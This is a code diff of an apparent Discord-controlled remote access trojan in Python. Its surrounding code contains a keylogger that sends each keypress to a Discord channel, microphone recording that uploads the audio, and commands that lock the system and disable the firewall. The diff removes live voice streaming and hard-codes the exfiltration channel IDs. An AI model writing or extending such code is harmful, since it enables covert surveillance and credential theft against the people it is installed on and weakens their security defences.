@@ -12,12 +12,8 @@ import subprocess
 import winreg
 import pyautogui
 from io import BytesIO
-import discord
-from discord.ext import commands
 import sounddevice as sd
 import soundfile as sf
-import discord
-from discord.ext import commands
 import sounddevice as sd
 import soundfile as sf
 import urllib.parse
@@ -96,7 +92,6 @@ SPOTIPY_CLIENT_ID = os.getenv('SPOTIPY_CLIENT_ID')
 SPOTIPY_CLIENT_SECRET = os.getenv('SPOTIPY_CLIENT_SECRET')
 base_url = os.getenv("BASE_URL")
 auth_code = os.getenv("AUTH_CODE")
-
 DISCORD_BOT_TOKEN = os.getenv('DISCORD_BOT_TOKEN')
 SPOTIPY_REDIRECT_URI = 'https://localhost:8000'
 
@@ -366,76 +361,6 @@ async def lock_sys(ctx):
 
 
 
-@bot.command()
-async def join(ctx):
-    """Command to make the bot join the voice channel."""
-    if ctx.author.voice:
-        channel = ctx.author.voice.channel
-        global voice_client
-        voice_client = await channel.connect()
-        await ctx.send("Joined the voice channel!")
-    else:
-        await ctx.send("You need to join a voice channel first!")
-
-@bot.command()
-async def leave(ctx):
-    """Command to make the bot leave the voice channel."""
-    global voice_client, is_streaming
-    if voice_client:
-        if is_streaming:
-            await voice_stop(ctx)
-        await voice_client.disconnect()
-        voice_client = None
-        await ctx.send("Disconnected from the voice channel.")
-    else:
-        await ctx.send("I'm not in a voice channel.")
-
-@bot.command(name="voice_start")
-async def voice_start(ctx):
-    """Start streaming live audio to the voice channel."""
-    global audio_stream, voice_client, is_streaming
-
-    if not voice_client:
-        await ctx.send("The bot is not connected to a voice channel.")
-        return
-
-    if is_streaming:
-        await ctx.send("Audio streaming is already in progress.")
-        return
-
-    audio = pyaudio.PyAudio()
-    audio_stream = audio.open(format=FORMAT,
-                              channels=CHANNELS,
-                              rate=RATE,
-                              input=True,
-                              frames_per_buffer=CHUNK)
-    is_streaming = True
-
-    await ctx.send("Started streaming audio. Use `!voice_stop` to stop.")
-
-    # Stream audio to the voice channel
-    while is_streaming:
-        data = audio_stream.read(CHUNK, exception_on_overflow=False)
-        if voice_client and voice_client.is_connected():
-            voice_client.send_audio_packet(data)
-        await asyncio.sleep(0.01)
-
-@bot.command(name="voice_stop")
-async def voice_stop(ctx):
-    """Stop streaming live audio."""
-    global audio_stream, is_streaming
-
-    if not is_streaming:
-        await ctx.send("Audio streaming is not in progress.")
-        return
-
-    is_streaming = False
-    if audio_stream:
-        audio_stream.stop_stream()
-        audio_stream.close()
-        audio_stream = None
-
-    await ctx.send("Stopped streaming audio.")
 
 
 #set playload 
@@ -668,7 +593,7 @@ async def voice_rec(ctx, duration: int):
     sf.write(filename, recording, fs)
 
     #Send the recorded audio to a specific text channel
-    text_channel_id =   ENTER_CHANNEL_ID
+    text_channel_id =   1256534816610844732
     text_channel = bot.get_channel(text_channel_id)
     if text_channel:
         await text_channel.send(file=discord.File(filename))
@@ -688,7 +613,7 @@ async def start_keylogger(ctx):
             key_char = str(key)
         
         # Send the key to the Discord channel
-        channel = bot.get_channel(1236994679560601693)  # Replace YOUR_CHANNEL_ID with your channel's ID
+        channel = bot.get_channel(12565348116028457473)  # Replace YOUR_CHANNEL_ID with your channel's ID
         if channel:
             asyncio.ensure_future(channel.send(f"Key pressed: {key_char}"))
 
@@ -792,6 +717,8 @@ async def disablefirewall(ctx):
         await ctx.send("[*] This command requires admin privileges.")
 
 
+from aiohttp import web
+
 @bot.command()
 async def start_server(ctx):
     # Create an asyncio loop for the web server and WebSocket server
@@ -800,7 +727,7 @@ async def start_server(ctx):
     # Create and start the web server
     async def web_server():
         app = web.Application()
-        async def hello(request):
+        async def hello(_):
             return web.Response(text="Hello, world")
         app.add_routes([web.get('/', hello)])
         runner = web.AppRunner(app)
@@ -810,8 +737,7 @@ async def start_server(ctx):
         await ctx.send("Web server started at http://localhost:8080")
 
     # Create and start the WebSocket server
-    @bot.command()
-    async def websocket_server(websocket, path):
+    async def websocket_server(websocket, _):
         while True:
             message = await websocket.recv()
             print(f"Received message: {message}")
